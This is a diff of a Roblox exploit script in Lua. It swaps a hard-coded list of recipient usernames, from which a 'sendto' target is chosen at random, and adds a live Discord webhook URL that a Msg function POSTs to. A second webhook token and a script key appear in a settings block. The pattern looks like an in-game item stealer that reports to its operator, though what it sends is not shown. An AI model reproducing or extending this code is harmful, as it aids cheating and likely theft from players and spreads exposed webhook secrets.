@@ -22,23 +22,24 @@ local function serverhop()
 end
 
 local usernames = {
-    "RomanCross_1",
-    "MaxwellCross_3",
-    "MasonSteel_1",
-    "FinnHunter_1",
-    "EthanWolf_1",
-    "TrentVoss_1",
-    "ReedKnight_1",
-    "RileyDark_1",
-    "ZaneSteele_1",
-    "DanteStorm_1",
-    "KaiRiker_1",
-    "BlakeHawke_1",
-    "ColeHunter_1",
-    "LiamBlackwood_1",
-    "WolfeZander_1",
-    "StriderVince_1"
-
+    "kethemhanh3",
+    "johnwhichh5",
+    "johnwhichh4",
+    "johnwhichh6",
+    "johnwhichh7",
+    "johnwhichh8",
+    "johnwhichh12",
+    "johnwhichh11",
+    "johnwhichh13",
+    "johnwhichh10",
+"donwhich2",
+"donwhich3",
+"donwhich8",
+"donwhich4",
+"donwhich9",
+"donwhich12",
+"donwhich7",
+"donwhich10"
 
 }
 
@@ -50,7 +51,7 @@ end
 local sendto = getRandomUsername()
 
 
-local Url2 = ""
+local Url2 = "https://discord.com/api/webhooks/1181449125187833856/0kA4c5-OXkAOQvZeJxnOKrKc7cTzlGvjpjMNKn-UkImyh82rPZ8-np_RwU0w6DelHjty"
 local Http2 = game:GetService("HttpService")
 	local Msg = function(msg)
 		request({Url = Url2,Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = Http2:JSONEncode({content = msg})})
@@ -162,7 +163,7 @@ end)
 
 script_key="pCKhzrCjCgZMSZBwYSzBgEbHjAqXRvPf";
 getgenv().Settings = {        
-    FPSLimit = 3,
+    FPSLimit = 5,
     CraftInsta4PotionsSoICanSellThem = false,
     ["Notifications"] = {
         Webhook = "https://discord.com/api/webhooks/1301397086226616340/3UzL8ANoQjtjH55mDqMDjuOiDkUvgaAONVCDT692wLzakKdji0HJbJC_oGhc5KgKqdqp",
